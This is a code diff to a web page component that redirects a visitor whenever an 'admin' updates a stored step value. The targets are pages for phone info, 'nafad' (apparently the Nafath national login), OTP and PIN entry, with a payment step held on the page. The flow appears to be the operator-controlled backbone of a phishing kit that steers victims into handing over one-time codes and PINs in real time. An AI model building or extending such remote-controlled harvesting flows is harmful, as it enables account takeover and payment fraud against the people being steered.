@@ -71,17 +71,27 @@ export default function CheckPage() {
           const data = docSnapshot.data()
           const step = data.currentStep
 
+          // Admin navigation: Handle page redirects
           if (step === "home") {
-            router.push("/main")
+            console.log("[check] Admin redirecting to home")
+            window.location.href = "/"
           } else if (step === "phone") {
-            router.push("/phone-info")
+            console.log("[check] Admin redirecting to phone-info")
+            window.location.href = "/phone-info"
           } else if (step === "nafad") {
-            router.push("/nafad")
+            console.log("[check] Admin redirecting to nafad")
+            window.location.href = "/nafad"
           } else if (step === "otp") {
-            router.push("/veri")
+            console.log("[check] Admin redirecting to otp")
+            window.location.href = "/veri"
           } else if (step === "pin") {
-            router.push("/confi")
+            console.log("[check] Admin redirecting to pin")
+            window.location.href = "/confi"
+          } else if (typeof step === "number") {
+            console.log("[check] Admin redirecting to home with step:", step)
+            window.location.href = "/"
           }
+          // If step === "payment" or "check", stay on this page
         }
       },
       (error) => {
